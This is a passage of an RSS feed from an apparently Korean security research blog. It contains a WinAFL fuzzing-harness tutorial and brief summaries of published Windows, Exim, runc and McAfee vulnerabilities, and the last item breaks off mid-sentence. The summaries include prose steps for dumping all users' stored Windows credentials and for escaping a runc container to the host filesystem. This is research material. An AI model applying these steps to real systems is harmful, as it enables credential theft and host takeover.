<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Sun, 23 May 2021 06:05:58 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Research] WinAFL로 마구 퍼징하기 Part1</title>
      <link>https://hackyboiz.github.io/2021/05/23/fabu1ous/winafl-1/</link>
      <guid>https://hackyboiz.github.io/2021/05/23/fabu1ous/winafl-1/</guid>
      <pubDate>Sun, 23 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;머릿말&quot;&gt;&lt;a href=&quot;#머릿말&quot; class=&quot;headerlink&quot; title=&quot;머릿말&quot;&gt;&lt;/a&gt;머릿말&lt;/h1&gt;&lt;p&gt;안녕하세요 Fabu1ous입니다. 최근 버그 바운티 프로젝트를 하면서 WinAFL 사용법을 익히고 있습니다. WinAF</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>안녕하세요 Fabu1ous입니다. 최근 버그 바운티 프로젝트를 하면서 WinAFL 사용법을 익히고 있습니다. WinAFL은 프로세스를 종료하지 않고 Harness 프로그램을 통해 특정 함수만을 반복 실행하는 방식을 사용해 빠른 퍼징이 가능합니다. Harness는 수레를 끌 수 있도록 말에게 씌우는 제갈, 말안장, 고삐 등이 합쳐진 기구입니다. <del>한글로는 마구라고 부르는데 마구로 마구 퍼징 하면 크래시가 마구마구 터지나?</del></p><p><img src="/2021/05/23/fabu1ous/winafl-1/1.png"></p><p>WinAFL에 대한 간단한 소개와 직접 Harness를 작성해본 과정을 정리해봤습니다. 이번 Part 1에선 처음 Harness를 작성하고 퍼징 해본 과정을, 다음 글인 Part 2에선 Harness의 속도 개선을 위해 삽질한 과정을 써볼까 합니다. </p><h1 id="WinAFL"><a href="#WinAFL" class="headerlink" title="WinAFL"></a>WinAFL</h1><p>AFL(American Fuzzy Lop)은 Coverage-guided 퍼징 툴입니다. Execution path 분석을 통한 넓은 코드 커버리지와 루프 실행을 통한 빠른 속도가 특징입니다. 그리고 이러한 AFL을 Windows에서 사용할 수 있게 변형한 것이 바로 WinAFL입니다.</p><p>이번 시리즈에선 WinAFL의 빠른 퍼징 속도에 집중해볼까 합니다. WinAFL의 반복 실행(iteration)은 다른 퍼저 들과 다른 방식을 사용하는데 이는 다음과 같습니다.</p><ol><li>타겟 함수에 도달할 때까지 프로그램 실행</li><li>코드 커버리지 기록</li><li>타겟 함수가 리턴할 때까지 실행</li><li>코드 커버리지 회수, input 파일 수정, EIP를 조작해 2번 과정으로 복귀</li><li>일정 횟수만큼 반복 실행 후 타겟 프로세스를 종료, 1번부터 다시 시작</li></ol><p>여기서 중요한 게 바로 4번 과정, 즉 프로세스를 종료하지 않고 타겟 함수만 반복 실행을 한다는 것입니다. 매번 프로세스를 종료하고 재시작하는데 드는 시간을 절약할 수 있고 타겟 함수와 그 서브 루틴만을 퍼징 하기 때문에 그만큼 빠른 속도를 낼 수 있습니다.</p><h1 id="환경-설정"><a href="#환경-설정" class="headerlink" title="환경 설정"></a>환경 설정</h1><p>기본적인 설명이 끝났으니 직접 사용해봐야겠죠? <a href="https://github.com/googleprojectzero/winafl">WinAFL 공식 깃허브</a>에 빌드하는 방법이 쓰여있기는 하지만 저는 그걸 보고도 삽 집해서 글로 남겨놓겠습니다. <del>멍청이</del></p><p><img src="/2021/05/23/fabu1ous/winafl-1/2.png"></p><h3 id="준비물"><a href="#준비물" class="headerlink" title="준비물"></a>준비물</h3><ol><li>Visual Studio</li><li>DynamoRIO</li><li>cmake</li><li>WinAFL</li></ol><p>각각 공식 홈페이지나 깃허브에서 쉽게 구하실 수 있습니다. 설마 여기서부터 막히시는 분은 없으리라 생각합니다. 웬만하면(특히 Visual Studio는) 최신 버전으로 준비해주세요.  </p><p><img src="/2021/05/23/fabu1ous/winafl-1/3.png"></p><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> build<span class="hljs-number">32</span><span class="hljs-attribute">cd</span> build<span class="hljs-number">32</span><span class="hljs-attribute">cmake</span> -G<span class="hljs-string">&quot;Visual Studio 16 2019&quot;</span> -A Win<span class="hljs-number">32</span> .. -DDynamoRIO_DIR=%DynamoRIO경로%\cmake</code></pre><p>Visual Studio의 command prompt를 관리자 권한으로 실행하고 winafl-master 폴더 내부로 들어가 위 명령어들을 실행해 주시면 됩니다. 저는 32bit짜리 DLL을 퍼징 하기 위해 <code>x86_x64 Cross Tools Command Prompt</code>를 사용했습니다. <code>-DDynamoRIO</code> 옵션 값에 DynamoRIO 속에 있는 cmake 폴더로 지정해주셔야 합니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/4.png"></p><p>위 사진과 같이 Configuring done, Generateing done이 출력된다면 빌드 준비가 끝났습니다.</p><pre><code class="hljs bash">cmake --build . --config Release</code></pre><p>이제 위 명령어를 입력해 빌드해주시면 됩니다. 빌드가 잘 되었다면 <code>%winafl-master%\build32\bin\Release</code>에 afl-fuzz.exe와 winafl.dll이 있습니다. 실제로 퍼징을 돌릴 때 사용할 친구들이니 꼭 위치를 기억해두세요. git clone 하면서 이미 컴파일된 실행파일도 존재하는데 이것들과 햇갈리시면 안 됩니다.</p><h1 id="Target-Function"><a href="#Target-Function" class="headerlink" title="Target Function"></a>Target Function</h1><p>WinAFL은 프로세스를 종료하지 않고 타겟 함수만을 반복 실행합니다. 아무 함수나 타겟으로 잡고 퍼징을 돌릴 수 있는 것은 아니고 몇 가지 충족해야 할 조건들이 있습니다. 따라서 퍼징에 들어가기 앞서 먼저 타겟 프로그램에 대한 분석을 해야 하고 타겟 함수 선정에 많은 시간을 투자하게 될 수도 있습니다. <del>참 깐깐하내</del></p><p>타겟 함수는 다음과 같은 조건을 만족해야 합니다.</p><ol><li>함수 내에서 input 파일을 열어야 함</li><li>그 파일을 파싱 해야 함</li><li>함수 내에서 input 파일을 닫아야 함</li><li>리턴까지 정상적으로 실행되어야 함</li></ol><p>위 조건을 만족하는 함수를 찾기 위해 제가 사용한 방법을 작성해보겠습니다. 우선 타겟 함수를 찾기 위해선 타겟 프로그램이 어떤 DLL을 사용하는지, 그 DLL의 역할은 무엇인지 대강 알아야 합니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/5.png"></p><p>마우스 커서를 DLL위에 올려보면 파일 설명, 제조사, 파일 버전 등의 정보를 얻을 수 있고 이는 1차적으로 타겟 DLL을 정하는데 도움이 됩니다. </p><p><img src="/2021/05/23/fabu1ous/winafl-1/6.png"></p><p>적당한 DLL을 찾으셨다면 IDA로 열어서 Exports 테이블 훑어봅시다. 운이 좋다면 External symbol이 살아있는 함수들 중 이름에 File 어쩌고저쩌고하는 함수가 몇 개 있을수도 있습니다. 이름만 보고도 타겟 함수의 자질이 보이는 경우가 있을 텐데 디컴파일한 후 위 조건에 충족하는지 확인해 보시면 됩니다. 저처럼 External symbol이 살아있는 함수가 거의 없고 그마저도 타겟 함수 충족 조건에 만족하지 않는다면</p><p><img src="/2021/05/23/fabu1ous/winafl-1/7.png"></p><p>Imports 테이블에서 파일 함수(예를 들면 fopen, wfopen, wfopen_s, fclose 등)를 검색해보시면 됩니다. 이래도 없다면 저는 다른 타겟을 찾아보는데 더 좋은 방법을 알고 계신 분이 있다면 댓글로 남겨주세요. 저는 Imports 테이블에서 해당 DLL이 <code>MSVCR100!fclose()</code>를 사용한다는 사실을 알아냈습니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/8.png"></p><p><img src="/2021/05/23/fabu1ous/winafl-1/9.png"></p><p>그다음 Windbg로 타겟 프로그램을 열어 방금 알아낸 <code>MSVCR100!fclose()</code>에 브레이크 포인트를 걸고 어떤 함수가 호출하는지 알아냈습니다. <code>fclose()</code>의 실행이 끝나면 <code>TargetDLL+0xbf62d</code>로 리턴한다는 사실을 알 수 있고</p><p><img src="/2021/05/23/fabu1ous/winafl-1/10.png"></p><p>해당 주소를 아이다로 열어(단축키 g : Jump to address) 함수의 시작 주소를 알 수 있습니다. 디컴파일을 통해 해당 함수의 코드를 분석해본 결과 file open, file parsing, file close 작업이 모두 있었고 따라서 <code>TargetDLL+0xbf5c0</code>을 타겟 함수로 정했습니다. 약간의 팁을 드리자면 타겟 함수가 받는 인자가 적으면 적을수록 다음 단계인 Harness 작성이 쉬워집니다. 파일 이름만을 인자로 받는다면 Best!</p><h1 id="Harness"><a href="#Harness" class="headerlink" title="Harness"></a>Harness</h1><p>타겟 함수를 정했으니 이제 타겟 DLL을 로드하고 타겟 함수가 필요로 하는 초기 설정을 해주는 Harness 프로그램을 작성해야 합니다. 기본적인 틀은 다음과 같습니다.</p><ol><li>TargetDLL.dll 로드</li><li>GetProcAddress()를 호출해 타겟 함수의 주소를 받아옴</li><li>타겟 함수 호출</li></ol><p>아쉽게도 제가 정한 타겟 함수는 심볼이 죽어있더군요. GetProcAddress()를 사용해 함수 주소를 받아올 수 없으니 다음과 같이 수정했습니다.</p><ol><li>TargetDll.dll 로드</li><li>TargetDll.dll의 base 주소 + 타겟 함수의 offset = 타겟 함수 주소</li><li>타겟 함수 호출</li></ol><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*TARGET)</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* filename)</span></span>;TARGET funcPtr;<span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) __declspec(noinline) <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fuzzme</span><span class="hljs-params">(<span class="hljs-keyword">wchar_t</span>* path)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> result = funcPtr(path);<span class="hljs-keyword">return</span> result;&#125; <span class="hljs-comment">// 퍼저에 지정해줄 반복 실행 대상입니다. Extern symbol을 살려두고</span><span class="hljs-comment">// 컴파일러가 인라인 처리하지 않도록 설정해줍니다.</span><span class="hljs-function"><span class="hljs-keyword">wchar_t</span>* <span class="hljs-title">charToWChar</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* text)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">size_t</span> size = <span class="hljs-built_in">strlen</span>(text) + <span class="hljs-number">1</span>;<span class="hljs-keyword">wchar_t</span>* wa = (<span class="hljs-keyword">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">wchar_t</span>) * size);mbstowcs(wa, text, size);<span class="hljs-keyword">return</span> wa;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;SetDllDirectory(<span class="hljs-string">&quot;...&quot;</span>); <span class="hljs-comment">// Dll 경로</span>HMODULE DLLHandle = LoadLibrary(<span class="hljs-string">&quot;TargetDll.dll&quot;</span>); <span class="hljs-comment">// 타겟 DLL</span><span class="hljs-keyword">if</span> (DLLHandle == <span class="hljs-number">0</span>)&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot load TargetDll.dll\n&quot;</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;funcPtr = (TARGET)DLLHandle + <span class="hljs-number">0xbf5c0</span>; <span class="hljs-comment">// base + offset</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, DLLHandle);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x\n&quot;</span>, funcPtr);<span class="hljs-keyword">int</span> result = fuzzme(funcPtr, charToWChar(argv[<span class="hljs-number">1</span>]));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, result);&#125;</code></pre><p>파일 이름을 <code>main</code>의 <code>argv</code>로 받아와 <code>fuzzme</code>를 거쳐 타겟 함수를 실행하는 Harness 코드입니다. 타겟 DLL이 32bit고 WinAFL도 32bit로 빌드했는데 Harness를 64bit로 컴파일하면 안 되겠죠? 32bit로 컴파일해줍니다.</p><pre><code class="hljs lsl">cd %DynamoRIO경로%\bin32drrun.exe -c <span class="hljs-string">&quot;%winafl경로%<span class="hljs-subst">\\</span>build32<span class="hljs-subst">\\</span>bin<span class="hljs-subst">\\</span>Release<span class="hljs-subst">\\</span>winafl.dll&quot;</span> -debug -target_module harness.exe -coverage_module <span class="hljs-string">&quot;%타겟DLL경로%&quot;</span> -target_method fuzzme -fuzz_iterations <span class="hljs-number">10</span> -nargs <span class="hljs-number">1</span> -- <span class="hljs-string">&quot;%harness경로%&quot;</span> <span class="hljs-string">&quot;%파일경로%&quot;</span></code></pre><p>이제 작성한 Harness를 디버그 모드로 테스트해볼 시간입니다. DanamoRIO의 bin32 폴더로 들어가 위와 같은 명령어를 통해 Harness가 퍼징에 적합한지 검사할 수 있습니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/11.png"></p><p>테스트가 끝나면 bin32 폴더에 테스트 로그가 남아있습니다. 위 명령어는 테스트 옵션 중 <code>iterations</code>를 10으로 주었으므로 총 10번의 실행이 로그에 남아있어야 하며 “Everything appears to be running normally.”라는 로그가 있다면 성공입니다.</p><h1 id="마구-퍼징하기"><a href="#마구-퍼징하기" class="headerlink" title="마구 퍼징하기"></a>마구 퍼징하기</h1><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> <span class="hljs-string">&quot;%winafl-master%경로\build32\bin\Release&quot;</span><span class="hljs-attribute">afl</span>-fuzz.exe -i in -o out -D %DynamoRIO경로% -t <span class="hljs-number">10000</span> -- -coverage_module TargetDll.dll -target_module harness.exe - target_method fuzzme -fuzz_iterations <span class="hljs-number">5000</span> -nargs <span class="hljs-number">1</span> -- <span class="hljs-string">&quot;%harness경로&quot;</span> @@</code></pre><p>자! 드디어 퍼징을 할 때가 왔습니다. 빌드한 WinAFL 폴더로 이동한 후 위 명령어를 입력해 퍼징을 시작합니다. WinAFL이 <code>fuzzme</code> 함수를 5000번 실행하고 프로세스를 재시작하도록 옵션을 주었습니다.</p><p><img src="/2021/05/23/fabu1ous/winafl-1/12.png"></p><p>이렇게 하면 WinAFL은 엄청난 속도로 펒…</p><p><img src="/2021/05/23/fabu1ous/winafl-1/13.png"></p><p><img src="/2021/05/23/fabu1ous/winafl-1/14.png"></p><h1 id="Part-2-예고"><a href="#Part-2-예고" class="headerlink" title="Part 2 예고"></a>Part 2 예고</h1><p>3초에 1번 꼴로 타겟이 실행되는 걸 보면 Harness에 큰 하자가 있는 것이 분명합니다. 다음 글에선 이 실행 속도를 개선하기 위해 삽질한 과정을 작성해 오도록 하겠습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/winafl/">winafl</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/harness/">harness</category>
      
      <category domain="https://hackyboiz.github.io/tags/bug-bounty/">bug bounty</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/23/fabu1ous/winafl-1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege</title>
      <link>https://hackyboiz.github.io/2021/05/23/j0ker/2021-05-23/</link>
      <guid>https://hackyboiz.github.io/2021/05/23/j0ker/2021-05-23/</guid>
      <pubDate>Sun, 23 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.tiraniddo.dev/2021/05/dumping-stored-credenti</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html">Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows에서는 <code>Credential Manager</code>를 통해 credential를 조작할 수 있습니다. Credential들은 DPAPI를 통해 보호되며, 시스템에 인증된 사용자만 접근할 수 있습니다.</p><p>예를 들어, Remote Desktop Client에서는 <code>CredWrite</code>라는 API를 통해 domain credential을 저장합니다. 이 때 <code>CREDENTIAL</code> 구조체에 유저명과 비밀번호를 저장하게 되며 type은 <code>CRED_TYPE_DOMAIN_PASSWORD</code>으로 세팅됩니다. 이렇게 저장된 credential들은 <code>CredRead</code>, <code>CredEnumerate</code> 같은 API를 통해 읽어올 수 있지만, <code>CRED_TYPE_DOMAIN_PASSWORD</code>로 type이 세팅되면 credential을 읽어와도 구조적으로 비밀번호를 읽을 수 없게 구현되어 있습니다. NTLM, Kerberos, TSSSP 같이 LSASS 프로세스에서 실행되는 보안 패키지들은 내부 API를 통해 이런 제약 없이 credential 비밀번호에 접근이 가능합니다.</p><p>Credential은 사용자의 <code>DPAPI</code> 키로 암호화되어 파일 형식으로 저장됩니다. 이를 직접적으로 복호화하여 비밀번호를 읽어올<code>수 없는 이유는 사용자의</code>DPAPI<code>키를 사용하더라도 LSASS에서 실행되는 코드에서만 DPAPI를 호출하여 복호화할 수 있도록 구현되어 있기 때문입니다. 따라서</code>Mimikatz<code>같은 툴에서는</code>LSASS`에 코드를 삽입하거나 메모리를 바로 읽어들이는 등 방식을 통해 credential을 읽어들입니다.</p><p>이 글에서 James Forshaw는 <code>LSASS</code>에 코드를 삽입하지 않고 <code>SeTrustedCredmanAccessPrivilege</code> 권한을 이용해 credential을 복호화하는 새로운 방법을 제안합니다.</p><p><code>SeTrustedCredmanAccessPrivilege</code>권한은 사용자가 인증된 사용자로서 <code>Credential Manager</code>에 접근할 수 있도록 하는 권한입니다. LSASRV.dll에 구현되어 있는 코드를 보면 <code>CredpIsRpcClientTrusted</code> 함수에서 해당 권한을 체크하는데, 이 함수는 <code>CredrReadByTokenHandle</code>와 <code>CredrBackupCredentials</code> 이 두 함수에서만 호출됩니다. 이 중 <code>CredBackupCredentials</code> 함수는 사용자의 credential을 백업하는 기능을 제공하며 <code>SeTrustedCredmanAccessPrivilege</code> 권한만 가지고 있으면 호출이 가능합니다. <code>CREDWIZ.exe</code> 프로그램에서 해당 함수를 사용합니다. <code>CREDWIZ.exe</code>를 실행하면 백업할 경로를 지정하고 <code>Winlogon</code> 프로세스에 RPC를 호출하여 credential을 백업하는데, 이 때 백업하는 데이터에는 모든 정보가 포함되어 있습니다. 이를 다시 복구하며 모든 정보가 담겨 있는 credential을 얻을 수 있습니다.</p><p>따라서 관리자 권한으로 아래 과정을 통해 모든 사용자의 credential을 획득할 수 있습니다.</p><ol><li><code>WinLogon</code> 프로세스에 접근해 토큰의 핸들을 획득합니다.</li><li>획득한 토큰을 Impersonation 토큰으로 복사하고 <code>SeTrustedCredmanAccessPrivilege</code> 권한을 활성화합니다.</li><li>인증된 사용자의 토큰을 Open 합니다.</li><li>Impersonation된 <code>WinLogon</code> 토큰을 활용하여 <code>CredBackupCredentials</code> 함수를 호출하고 원하는 경로에 crendential을 저장합니다. 이 때 백업 시 비밀번호는 NULL로 설정할 수 있어 추가적인 복호화할 수고를 덜 수 있습니다.</li><li>Impersonation 상태에서 <code>CryptUnprotectData</code> 함수를 통해 credential을 복호화합니다.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/token/">token</category>
      
      <category domain="https://hackyboiz.github.io/tags/privileges/">privileges</category>
      
      <category domain="https://hackyboiz.github.io/tags/setrustedcredmanaccessprivilege/">setrustedcredmanaccessprivilege</category>
      
      <category domain="https://hackyboiz.github.io/tags/credentials/">credentials</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/23/j0ker/2021-05-23/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-28018: Unix 계열 메일 에이전트 RCE</title>
      <link>https://hackyboiz.github.io/2021/05/22/fabu1ous/2021-05-22/</link>
      <guid>https://hackyboiz.github.io/2021/05/22/fabu1ous/2021-05-22/</guid>
      <pubDate>Sat, 22 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://adepts.of0x.cc/exim-cve-2020-28018/&quot;&gt;CVE-2020-280</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://adepts.of0x.cc/exim-cve-2020-28018/">CVE-2020-28018 (Use-After-Free in Exim)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Exim 4 &lt;= 4.92.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Unix 계열 운영 체제의 MTA(Mail Transfer Agent)인 Exim에서 use-after-free 취약점이 발견되었습니다. <code>tls-openssl.c</code>에 존재하는 해당 취약점을 통해 로컬 권한 상승 및 원격 코드 실행을 할 수 있습니다. </p><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> tls<span class="hljs-constructor">_write(<span class="hljs-params">void</span> <span class="hljs-operator">*</span> <span class="hljs-params">ct_ctx</span>, <span class="hljs-params">const</span> <span class="hljs-params">uschar</span> <span class="hljs-operator">*</span><span class="hljs-params">buff</span>, <span class="hljs-params">size_t</span> <span class="hljs-params">len</span>, BOOL <span class="hljs-params">more</span>)</span>&#123;...  corked = <span class="hljs-built_in">string</span><span class="hljs-constructor">_catn(<span class="hljs-params">corked</span>, <span class="hljs-params">buff</span>, <span class="hljs-params">len</span>)</span>;    ...  <span class="hljs-keyword">if</span> (more)    return len;  buff = CUS corked-&gt;s;  len = corked-&gt;ptr;  corked = NULL;...&#125;</code></pre><p>위는 <code>tls-openssl.c</code>의 함수 <code>tls_write()</code> 일부 코드입니다. 함수 <code>string_catn()</code>는 <code>gstring</code> 구조체가 request 데이터를 담기에 충분한 메모리 공간을 가지고 있는지 검사하고 <code>gstring_grow()</code>를 호출해 새로운 청크를 할당한 후 <code>gstring-&gt;s</code> 필드에 저장합니다. <code>string_catn()</code>이 반환한 <code>gstring</code> 포인터를 <code>corked</code>에 저장하고 이후에 <code>gstring</code>에 접근해야 할 일이 생기면 <code>corked</code>를 사용합니다. 문제는 <code>corked</code>가 NULL로 초기화되는 루틴을 무시할 수 있어 <code>corked-&gt;s</code>가  해제된 이후에도 <code>corked</code>를 통해 접근(use-after-free)할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/unix/">unix</category>
      
      <category domain="https://hackyboiz.github.io/tags/exim/">exim</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/22/fabu1ous/2021-05-22/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30465: Docker, Kubernetes의 runc Container Escape 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/21/l0ch/2021-05-21/</link>
      <guid>https://hackyboiz.github.io/2021/05/21/l0ch/2021-05-21/</guid>
      <pubDate>Fri, 21 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://seclists.org/oss-sec/2021/q2/157&quot;&gt;CVE-2021-30465:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/157">CVE-2021-30465: runc &lt;1.0.0-rc95 vulnerable to symlink-exchange attack</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>runc ≤ 1.0.0-rc94 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Docker, Kubernetes 등 대부분의 컨테이너 기반 가상화 서비스에서 사용되는 runc에서 취약점이 발견되어 세부 보고서가 공개되었습니다.</p><p>runc는 OCI(Open Container Initiative) 표준을 기반으로 컨테이너 생성과 실행을 위해 설계된 CLI 도구입니다. 지난 2019년 Container escape 취약점(CVE-2019-5736)이 공개된 데 이어 이번에 공개된 취약은 symlink exchange attack으로 호스트 파일 시스템이 컨테이너에 마운트 되도록 할 수 있는 escape 취약점입니다.</p><p>컨테이너가 시작되고 runc가 컨테이너 공유 볼륨 내부에 마운트 되는 경우 runc는 마운트 되는 대상을 검사합니다. 이때 마운트 대상을 컨테이너 rootfs 외부의 호스트 파일 시스템의 심볼릭 링크로 교체하면 컨테이너를 escape 해 컨테이너에서 호스트 파일 시스템에 접근할 수 있습니다. 일반적인 경우 <code>MS_SLAVE</code> 전파 타입이 적용된 마운트 네임스페이스 내에서는 호스트에 접근할 수 없지만 Kubernetes와 같이 볼륨 관리 인프라가 존재하는 경우 다음과 같이 컨테이너에서 호스트 파일 시스템을 마운트 할 수 있습니다.</p><ol><li>해커는 잘 알려진 호스트의 볼륨 관리에 사용되는 경로로 접근</li><li>마운트 소스 디렉토리에 호스트의 <code>/</code> 에 대한 심볼릭 링크를 생성하는 악성코드 실행</li><li>컨테이너의 후속 마운트에서 toctou를 트리거해 <code>/</code> 를 마운트</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
      
      <category domain="https://hackyboiz.github.io/tags/escape/">escape</category>
      
      <category domain="https://hackyboiz.github.io/tags/docker/">docker</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/vulnerability/">vulnerability</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/21/l0ch/2021-05-21/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-23874: McAfee COM-objects 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/20/idioth/2021-05-20/</link>
      <guid>https://hackyboiz.github.io/2021/05/20/idioth/2021-05-20/</guid>
      <pubDate>Thu, 20 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://the-deniss.github.io/posts/2021/05/17/discovering</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://the-deniss.github.io/posts/2021/05/17/discovering-and-exploiting-mcafee-com-objects.html">Discovering and exploiting McAfee COM-objects (CVE-2021-23874)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>McAfee Total Protection 16.0.30 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>McAfee의 플래그십 안티 바이러스 제품 McAfee Total Protection의 COM 객체에서 local privilege escalation이 가능한 취약점이 발견되었습니다.</p><p>McAWFwk 서비스에서 <code>CoInitializeSecurity</code> 함수가 호출될 때 <code>pSecDesc</code> 파라미터는 널 포인터이며 <code>dwCapabilities</code>의 값은 0입니다. <code>dwCapabilities</code> 파라미터에 <code>EOAC_AAPID</code>나 <code>EOAC_ACCESS_CONTROL</code> 플래그가 설정되어 있지 않으면, <code>CoInitializeSecurity</code>는 <code>pSecDesc</code>를 액세스 검사에 사용하는 포인터로 인식합니다. 따라서 <code>pSecDesc</code>가 널 포인터이므로 ACL 검사를 수행하지 않습니다.</p><p>이를 통해 시작 시 <code>IMcClassFactory</code>를 통해 <code>CoManageOem Class</code> 객체를 구현하고 <code>IMcClassFactory::InternalCreateObject</code>를 통해 객체를 반환 받아 